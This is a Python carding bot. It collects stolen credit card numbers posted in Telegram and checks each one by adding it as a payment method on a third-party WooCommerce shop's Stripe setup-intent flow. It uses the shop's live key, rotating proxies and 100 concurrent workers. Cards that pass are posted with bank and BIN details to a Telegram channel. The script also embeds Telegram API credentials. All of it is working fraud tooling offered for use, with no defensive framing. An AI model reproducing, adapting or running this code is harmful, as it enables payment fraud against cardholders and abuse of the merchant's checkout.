import asyncio, aiohttp, re, os
from aiohttp import ClientSession, TCPConnector
from telethon import TelegramClient, events

API_ID = 28909605
API_HASH = '79620d3ae963bc568b92375dff884c13'
SESSION_NAME = 'ccsession'
CHANNEL_USERNAME = 'sendmeccs'
DOMAIN = "https://infiniteautowerks.com/"
PK = "pk_live_51MwcfkEreweRX4nmQHMS2A6b1LooXYEf671WoSSZTusv9jAbcwEwE5cOXsOAtdCwi44NGBrcmnzSy7LprdcAs2Fp00QKpqinae"
GATEWAY_NAME = "Stripe Auth"
MAX_WORKERS = 100

checked_ccs = set()
posted_ccs = set()
proxy_list = []
CC_REGEX = r"\b\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}\b"

async def load_proxies():
    global proxy_list
    try:
        with open("proxies.txt") as f:
            proxy_list = [line.strip() for line in f if line.strip()]
    except:
        proxy_list = []

def get_proxy():
    if not proxy_list:
        return None
    return f"http://{proxy_list[hash(asyncio.current_task()) % len(proxy_list)]}"

def parseX(data, start, end):
    try:
        return data.split(start)[1].split(end)[0]
    except Exception:
        return "None"

async def make_request(session, url, method="POST", params=None, headers=None, data=None, json=None, proxy=None):
    print(f"\n[REQUEST] {method} {url}")
    if headers: print(f"[HEADERS] {headers}")
    if data: print(f"[DATA] {data}")
    resp = await session.request(method, url, params=params, headers=headers, data=data, json=json, proxy=proxy)
    text = await resp.text()
    print(f"[RESPONSE] {resp.status}\n{text[:400]}\n{'-'*40}")
    return text, resp

async def bin_lookup(bin_num, session):
    try:
        async with session.get(f"https://lookup.binlist.net/{bin_num}", timeout=10) as resp:
            if resp.status == 200:
                data = await resp.json()
                brand = data.get("scheme", "N/A").upper()
                type_ = data.get("type", "N/A").title()
                bank = data.get("bank", {}).get("name", "N/A")
                country = data.get("country", {}).get("name", "N/A")
                emoji = data.get("country", {}).get("emoji", "")
                return f"{brand} - {type_}\n𝐈𝐬𝐬𝐮𝐞𝐫: {bank}\n𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country} {emoji}"
    except:
        pass
    return "BIN Info Not Found"

async def ppc(client, cc_data):
    try:
        cc, mon, year, cvv = cc_data.split("|")
        year = year[-2:]
    except:
        return

    proxy = get_proxy()
    connector = TCPConnector(ssl=False) if not proxy else None
    proxy_url = proxy if proxy else None

    async with aiohttp.ClientSession(connector=connector) as my_session:
        headers = {
            "user-agent": "Mozilla/5.0", 
            "referer": f"{DOMAIN}/my-account/payment-methods/"
        }
        try:
            res1, _ = await make_request(my_session, f"{DOMAIN}/my-account/add-payment-method/", method="GET", headers=headers, proxy=proxy_url)
            nonce = parseX(res1, '"createAndConfirmSetupIntentNonce":"', '"')
        except:
            return
        if nonce == "None":
            return

        data2 = {
            "type": "card", "card[number]": cc, "card[cvc]": cvv, "card[exp_year]": year,
            "card[exp_month]": mon, "billing_details[address][postal_code]": "99501",
            "billing_details[address][country]": "US", "key": PK, "_stripe_version": "2024-06-20",
        }
        headers2 = {
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": "Mozilla/5.0",
        }
        try:
            res2, _ = await make_request(my_session, "https://api.stripe.com/v1/payment_methods", data=data2, headers=headers2, proxy=proxy_url)
            pmid = parseX(res2, '"id": "', '"')
        except:
            return
        if pmid == "None":
            return

        data3 = {
            "action": "create_and_confirm_setup_intent",
            "wc-stripe-payment-method": pmid,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": nonce,
        }
        headers3 = {
            "x-requested-with": "XMLHttpRequest",
            "referer": f"{DOMAIN}/my-account/add-payment-method/",
            "user-agent": "Mozilla/5.0",
        }
        try:
            res3, _ = await make_request(my_session, f"{DOMAIN}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", data=data3, headers=headers3, proxy=proxy_url)
        except:
            return

        # Only POST if "succeeded" found and not already posted
        if "succeeded" in res3 and cc_data not in posted_ccs:
            bininfo = await bin_lookup(cc[:6], my_session)
            msg = f"""
𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅

𝗖𝗮𝗿𝗱: {cc_data}
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {GATEWAY_NAME}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Approved

𝗜𝗻𝗳𝗼:  {bininfo}
"""
            try:
                await client.send_message(CHANNEL_USERNAME, msg)
                posted_ccs.add(cc_data)
                print(f"[✅] Sent to @{CHANNEL_USERNAME}: {cc_data}")
            except Exception as e:
                print(f"[❌] Failed to post: {e}")

async def worker(queue, client):
    while True:
        cc = await queue.get()
        if cc not in checked_ccs and cc not in posted_ccs:
            checked_ccs.add(cc)
            await ppc(client, cc)
        queue.task_done()

async def main():
    await load_proxies()
    queue = asyncio.Queue()
    client = TelegramClient(SESSION_NAME, API_ID, API_HASH)

    @client.on(events.NewMessage(incoming=True))
    async def handler(event):
        message = event.raw_text
        matches = re.findall(CC_REGEX, message)
        for cc in matches:
            if cc not in checked_ccs and cc not in posted_ccs:
                await queue.put(cc)

    await client.start()
    print("[🟢] Listening for CCs...")

    for _ in range(MAX_WORKERS):
        asyncio.create_task(worker(queue, client))

    await client.run_until_disconnected()

# === Flask Uptime Server ===
from flask import Flask
from threading import Thread

app = Flask(__name__)

@app.route('/')
def home():
    return "Main.py is running"

def run_flask():
    app.run(host='0.0.0.0', port=8080)

# === Main Start ===
if __name__ == "__main__":
    Thread(target=run_flask).start()  # Start Flask for UptimeRobot
    asyncio.run(main())               # Start your async main loop
